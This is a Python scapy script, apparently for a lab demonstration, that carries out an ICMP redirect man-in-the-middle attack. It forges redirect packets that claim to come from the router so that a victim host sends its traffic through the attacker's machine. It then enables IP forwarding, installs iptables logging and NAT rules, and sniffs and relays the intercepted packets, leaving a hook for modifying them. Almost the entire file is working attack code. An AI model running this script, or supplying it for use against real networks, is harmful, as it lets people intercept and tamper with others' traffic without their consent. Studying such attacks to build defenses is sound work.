#!/usr/bin/env python3
"""
ICMP Redirect Attack Implementation
This script performs an ICMP redirect attack to intercept victim's traffic.

Attack Flow:
1. Monitor victim's traffic to external destinations
2. Send ICMP redirect message to victim
3. Redirect victim's traffic through attacker
4. Optionally intercept/modify the traffic
"""

import socket
import struct
import time
import threading
import sys
import subprocess
from scapy.all import *

class ICMPRedirectAttacker:
    def __init__(self):
        self.victim_ip = "192.168.1.10"
        self.router_ip = "192.168.1.1"
        self.attacker_ip = "192.168.1.20"
        self.external_target = "10.0.0.100"
        self.interface = "eth0"
        self.running = False
        
        print(f"[*] ICMP Redirect Attacker initialized")
        print(f"[*] Victim IP: {self.victim_ip}")
        print(f"[*] Router IP: {self.router_ip}")
        print(f"[*] Attacker IP: {self.attacker_ip}")
        print(f"[*] External Target: {self.external_target}")
        
    def enable_ip_forwarding(self):
        """Enable IP forwarding so we can act as a router"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         capture_output=True, check=True)
            print("[*] IP forwarding enabled")
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to enable IP forwarding: {e}")
            
    def get_victim_mac(self):
        """Get victim's MAC address via ARP"""
        try:
            # Send ARP request to get victim's MAC
            arp_request = ARP(op=1, pdst=self.victim_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                victim_mac = answered_list[0][1].hwsrc
                print(f"[*] Victim MAC address: {victim_mac}")
                return victim_mac
            else:
                print("[!] Could not determine victim's MAC address")
                return None
        except Exception as e:
            print(f"[!] Error getting victim MAC: {e}")
            return None
            
    def monitor_victim_traffic(self):
        """Send periodic ICMP redirects to redirect victim traffic"""
        print(f"[*] Starting proactive ICMP redirect attack")
        print(f"[*] Will send ICMP redirects every 3 seconds")
        
        try:
            while self.running:
                # Send ICMP redirect for the external target
                self.send_icmp_redirect_proactive()
                
                # Wait before next round
                time.sleep(3)
                
        except Exception as e:
            print(f"[!] Error in ICMP redirect attack: {e}")
            
    def send_icmp_redirect_proactive(self):
        """Send proactive ICMP redirect without waiting for traffic"""
        try:
            print(f"[*] Sending ICMP redirect to victim...")
            
            # Create a more realistic original packet that would trigger redirect
            # This simulates a packet the victim would send to the external target
            fake_original = IP(src=self.victim_ip, dst=self.external_target) / ICMP(type=8, code=0, id=0x1234)
            
            # Create ICMP redirect packet (Type 5, Code 1 = Redirect for Host)
            icmp_redirect = IP(src=self.router_ip, dst=self.victim_ip) / \
                           ICMP(type=5, code=1, gw=self.attacker_ip) / \
                           fake_original
            
            # Send the redirect packet
            send(icmp_redirect, verbose=False)
            
            print(f"[+] ICMP redirect sent: {self.router_ip} -> {self.victim_ip}")
            print(f"[+] Telling victim to use {self.attacker_ip} as gateway for {self.external_target}")
            
        except Exception as e:
            print(f"[!] Error sending ICMP redirect: {e}")
            
            
    def send_icmp_redirect(self, original_pkt):
        """Send ICMP redirect message to victim"""
        try:
            print(f"[*] Sending ICMP redirect to victim...")
            
            # Create ICMP redirect packet
            # ICMP Type 5 (Redirect), Code 1 (Redirect for Host)
            icmp_redirect = IP(src=self.router_ip, dst=self.victim_ip) / \
                           ICMP(type=5, code=1, gw=self.attacker_ip) / \
                           original_pkt[IP]
            
            # Send the redirect packet
            send(icmp_redirect, verbose=False)
            
            print(f"[*] ICMP redirect sent: Router {self.router_ip} tells victim {self.victim_ip}")
            print(f"    to use gateway {self.attacker_ip} for destination {self.external_target}")
            
        except Exception as e:
            print(f"[!] Error sending ICMP redirect: {e}")
            
    def setup_traffic_interception(self):
        """Setup iptables rules to intercept and forward victim's traffic"""
        try:
            # Add iptables rules to intercept and log victim's traffic
            rules = [
                # Log intercepted packets
                f"iptables -A FORWARD -s {self.victim_ip} -d {self.external_target} -j LOG --log-prefix 'INTERCEPTED: '",
                # Forward victim's traffic to external target
                f"iptables -A FORWARD -s {self.victim_ip} -d {self.external_target} -j ACCEPT",
                # Enable NAT for forwarded traffic
                f"iptables -t nat -A POSTROUTING -s {self.victim_ip} -d {self.external_target} -j MASQUERADE",
            ]
            
            for rule in rules:
                try:
                    subprocess.run(rule.split(), capture_output=True, check=True)
                    print(f"[*] Added iptables rule: {rule}")
                except subprocess.CalledProcessError:
                    pass  # Rule might already exist
                    
        except Exception as e:
            print(f"[!] Error setting up traffic interception: {e}")
            
    def intercept_and_forward(self):
        """Intercept victim's traffic and forward it (with optional modification)"""
        print(f"[*] Starting traffic interception...")
        
        def forward_handler(pkt):
            if not self.running:
                return
                
            # Check if packet is from victim to external target
            if (pkt.haslayer(IP) and 
                pkt[IP].src == self.victim_ip and 
                pkt[IP].dst == self.external_target):
                
                print(f"[*] Intercepted packet: {self.victim_ip} -> {self.external_target}")
                
                # Here you could modify the packet if needed
                # For now, just forward it
                
                # Remove Ethernet header and forward as IP packet
                if pkt.haslayer(Ether):
                    ip_pkt = pkt[IP]
                    send(ip_pkt, verbose=False)
                    print(f"[*] Forwarded packet to {self.external_target}")
                    
        # Sniff for packets destined for external target
        sniff(iface=self.interface, prn=forward_handler, store=0,
              filter=f"src host {self.victim_ip} and dst host {self.external_target}",
              stop_filter=lambda x: not self.running)
              
    def display_routing_info(self):
        """Display current routing information (attacker only)"""
        print("\n[*] Current routing information:")
        
        try:
            # Show attacker's routing table  
            print(f"\nAttacker ({self.attacker_ip}) routing table:")
            result = subprocess.run(['ip', 'route', 'show'], capture_output=True, text=True)
            if result.returncode == 0:
                print(result.stdout)
            else:
                print("Could not retrieve attacker's routing table")
                
            # Show ARP table
            print(f"\nAttacker ARP table:")
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            if result.returncode == 0:
                print(result.stdout)
            else:
                print("Could not retrieve ARP table")
                
        except Exception as e:
            print(f"[!] Error displaying routing info: {e}")
            
    def start_attack(self):
        """Start the ICMP redirect attack"""
        print("\n" + "="*60)
        print("Starting ICMP Redirect Attack")
        print("="*60)
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Setup traffic interception rules
        self.setup_traffic_interception()
        
        # Get victim's MAC address
        victim_mac = self.get_victim_mac()
        
        # Display current routing info
        self.display_routing_info()
        
        self.running = True
        
        try:
            # Start traffic monitoring in a separate thread
            monitor_thread = threading.Thread(target=self.monitor_victim_traffic)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Start traffic interception in another thread
            intercept_thread = threading.Thread(target=self.intercept_and_forward)
            intercept_thread.daemon = True
            intercept_thread.start()
            
            print(f"\n[*] Attack started! Monitoring victim traffic...")
            print(f"[*] Waiting for victim to send packets to {self.external_target}")
            print(f"[*] Press Ctrl+C to stop the attack")
            
            # Keep the main thread alive
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n[*] Attack stopped by user")
            self.running = False
            
    def cleanup(self):
        """Clean up iptables rules"""
        try:
            cleanup_rules = [
                f"iptables -D FORWARD -s {self.victim_ip} -d {self.external_target} -j LOG --log-prefix 'INTERCEPTED: '",
                f"iptables -D FORWARD -s {self.victim_ip} -d {self.external_target} -j ACCEPT",
                f"iptables -t nat -D POSTROUTING -s {self.victim_ip} -d {self.external_target} -j MASQUERADE",
            ]
            
            for rule in cleanup_rules:
                try:
                    subprocess.run(rule.split(), capture_output=True)
                except:
                    pass  # Rule might not exist
                    
            print("[*] Cleanup completed")
            
        except Exception as e:
            print(f"[!] Error during cleanup: {e}")

def main():
    print("ICMP Redirect Attack Demonstration")
    print("==================================")
    
    attacker = ICMPRedirectAttacker()
    
    try:
        attacker.start_attack()
    finally:
        attacker.cleanup()

if __name__ == "__main__":
    main()
